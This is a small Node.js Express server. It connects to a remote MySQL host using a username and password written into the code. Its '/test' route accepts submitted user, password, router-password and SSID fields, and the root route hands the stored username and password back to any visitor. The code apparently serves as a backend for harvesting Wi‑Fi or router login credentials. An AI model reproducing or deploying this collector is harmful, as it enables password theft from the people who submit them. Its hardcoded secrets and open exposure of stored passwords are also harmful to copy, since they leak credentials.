// Setup empty JS object to act as endpoint for all routes
var lol = {"user":"","pass":""};
// Require Express to run server and routes
const express = require('express');
// Start up an instance of app
const app = express();
/* Dependencies */
const bodyParser = require('body-parser')
/* Middleware*/
//Here we are configuring express to use body-parser as middle-ware.
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Cors for cross origin allowance
const cors = require('cors');
app.use(cors());
// Initialize the main project folder
app.use(express.static('website'));

// mysql
var mysql = require('mysql');

var con = mysql.createConnection({
  host: "remotemysql.com",
  user: "oInlIDhHL4",
  password: "gfSWeNRSXp"
});

con.connect(function(err) {
  if (err) throw err;
  console.log("Connected!");
});
// Setup Server

//const port = 8000;
const port = process.env.PORT || 80

const server = app.listen(port, listening);
function listening(){
    console.log("server running"); 
    console.log('running on localhost: '+port);
}


  //Get Data
app.post('/test', function (request, response) {
    if(request.body.pass || request.body.routerPass || request.body.ssid){
    lol = {
    
    "user":request.body.user ? request.body.user : lol.user,
    "pass":request.body.pass ? request.body.pass : lol.pass
  }
  };
  response.send({"lol":request.body});

  });

    //Get Data
app.get('/', function (request, response) {
    response.send(lol);
  });